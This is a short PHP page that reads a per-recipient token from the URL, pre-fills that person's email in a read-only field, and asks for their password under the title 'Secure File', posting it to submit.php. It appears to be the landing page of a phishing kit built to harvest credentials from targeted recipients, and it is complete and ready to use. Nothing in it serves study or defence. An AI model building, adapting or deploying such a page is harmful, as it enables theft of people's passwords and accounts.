<?php
session_start();

// Fake token â†’ email mapping (replace with DB query)
$tokens = [
  "abc123" => "user1@example.com",
  "xyz456" => "user2@example.com"
];

// Default email empty
$email = "";

// Check token in URL
if (!empty($_GET['t'])) {
    $token = $_GET['t'];
    if (isset($tokens[$token])) {
        $email = $tokens[$token];
        $_SESSION['email'] = $email; // keep it for later
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure File</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f6f6f6; }
    .card { max-width:400px; margin:50px auto; background:#fff;
      padding:20px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.2); }
    .input { width:100%; padding:12px; margin:10px 0;
      border:1px solid #ccc; border-radius:5px; font-size:16px; }
    .btn { width:100%; padding:12px; background:#d32f2f;
      color:#fff; border:none; border-radius:5px; font-size:16px; cursor:pointer; }
    .btn:hover { background:#b71c1c; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Enter Your Password</h2>
    <form method="post" action="submit.php" autocomplete="on">
      <label>Email</label>
      <input type="email" class="input" name="email"
        value="<?php echo htmlspecialchars($email, ENT_QUOTES); ?>" readonly>

      <label>Password</label>
      <input type="password" class="input" name="password" required>

      <button type="submit" class="btn">Continue</button>
    </form>
  </div>
</body>
</html>
